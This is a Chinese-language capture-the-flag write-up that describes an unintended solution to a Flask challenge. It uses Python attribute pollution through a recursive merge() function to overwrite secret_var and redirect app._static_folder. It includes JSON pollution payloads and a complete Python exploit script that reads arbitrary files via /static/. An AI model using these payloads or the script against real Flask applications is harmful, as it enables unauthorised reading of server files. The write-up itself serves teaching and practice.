
#wp #web #flask全局变量污染 #非预期

【[[WEB]]】【WEB】flask - [[扩展题目]]

创建时间：2025-07-15 19:41

### 解题过程
## “非预期”利用链完整剖析

> **一句话概括**  
> 出题人只想让选手通过业务逻辑或 Jinja2/SSTI 去读 `flag`，但由于
> 
> 1. **递归合并函数 `merge()`** 把 _任意 JSON 键_ 写入 **任意 Python 对象**；
>     
> 2. Flask 在运行时暴露了可读可写的 **全局对象 `app`**；
>     
> 3. Flask 允许 **带 body 的 GET** 请求；
>     
> 
> 攻击者可以一次请求就重写
> 
> ```python
> secret_var        # 让 / 路由通过 if 判断
> app._static_folder  # 把静态目录改到任意路径
> ```
> 
> 再用 `/static/文件名` 直接下载服务器文件，从而**旁路**了全部原设计步骤。

---

### 1 merge() 的“Python 原型链污染”本质

```python
def merge(src, dst):
    for k, v in src.items():
        if isinstance(v, dict) and hasattr(dst, k):
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)   # ★ 关键漏洞：向任意对象写属性
```

- 问题关键：**`setattr(dst, k, v)`** 会把 `k` 当成属性写进 `dst`；
    
- 只要我们能把 `dst` 引到 **模块对象** 或 **Flask app 对象**，就能修改其内部状态；
    
- 引用链利用 **双下划线属性** (`__globals__`、`__self__`、`__init__` 等) 可从普通函数一路追到模块全局命名空间。
    

> 这种“把任意 JSON 深度合并到 Python 对象” ≈ JS 里的 Prototype Pollution，只是换到 Python 叫 “Attribute Pollution”。

---

### 2 写 `secret_var` 触发 `/` 逻辑分支

源码节选：

```python
secret_var = 0            # 初始为 0

@app.route('/')
def home():
    if secret_var == 123414435:
        with open('Thechickenarmylivesforever', 'rb') as f:
            return Response(f.read())
    return "哥哥之物就交给你了!!!\nflag在 Thechickenarmylivesforever文件里"
```

我们构造 JSON：

```json
{
  "__init__": {
    "__globals__": {
      "secret_var": 123414435
    }
  }
}
```

- `__init__` → 拿到绑定方法对象；
    
- `__globals__` → 进入模块字典；
    
- 最终把 `secret_var` 覆盖为目标值，`/` 视图就会尝试读取文件。
    

---

### 3 写 `app._static_folder` 实现任意文件下载

Flask 中静态资源由 `send_from_directory(app._static_folder, path)` 处理。  
将その值改到项目根目录 `.`（或直接 `/`）即可把服务器中任何可读文件映射到 `/static/` 路由。

```json
{
  "__init__": {
    "__globals__": {
      "app": {
        "_static_folder": "."
      }
    }
  }
}
```

与写 `secret_var` 合并后，一次 `/chick` 请求即可同时污染两处全局变量。

---

### 4 第三步：读取目标文件

1. 先访问 `/chick`（GET + body），触发两处污染；
    
2. 再访问
    
    ```
    /static/Thechickenarmylivesforever
    ```
    
    Flask 会按新的静态根目录把文件内容直接回传。
    
3. 结果即 flag
    
    ```
    flag{tou_and@fewOo!!very happy(^.^)..because_of)you}
    ```
    

这条链子**完全不依赖**模板渲染、路径穿越或 RCE，属于典型的 **低复杂度全局状态污染** 非预期。

---
exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
getflag_v2.py  –  先污染 secret_var，再把 app._static_folder 指到 '.',
最后通过 /static/Thechickenarmylivesforever 拿 flag
"""
import json, requests, sys, re

base = "http://110.42.47.169:35870"          # ← 换成你的 URL:PORT
if len(sys.argv) == 2:
    base = sys.argv[1].rstrip("/")

HEADERS = {"Content-Type": "application/json"}

# -------- ① 一次性把两个全局变量都改掉 --------
payload = {
    "__init__": {
        "__globals__": {
            "secret_var": 123414435,             # 让 home() 满足 if
            "app": {"_static_folder": "."}       # 把静态目录改到程序根目录
        }
    }
}

print("[*] 污染全局变量 …")
r1 = requests.get(f"{base}/chick", data=json.dumps(payload), headers=HEADERS, timeout=8)
print("    /chick →", r1.status_code, r1.text.strip())

# -------- ② 直接 GET 静态资源 --------
target = f"{base}/static/Thechickenarmylivesforever"
print("[*] 尝试读取", target)
r2 = requests.get(target, timeout=8)

if r2.status_code == 200 and r2.text.strip():
    flag = re.search(r"[if]dek\{[0-9a-f]{32}\}", r2.text, re.I)
    if flag:
        print("\n[+] 成功拿到 flag:", flag.group())
    else:
        print("\n[+] 读取成功，但未匹配到 idek/flag 格式，完整内容 ↓↓↓\n")
        print(r2.text[:500])
else:
    print(f"[!] 读取失败 ({r2.status_code})，响应前 200 字节：\n{r2.text[:200]}")

```
---
![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250716235047632.png)
离谱。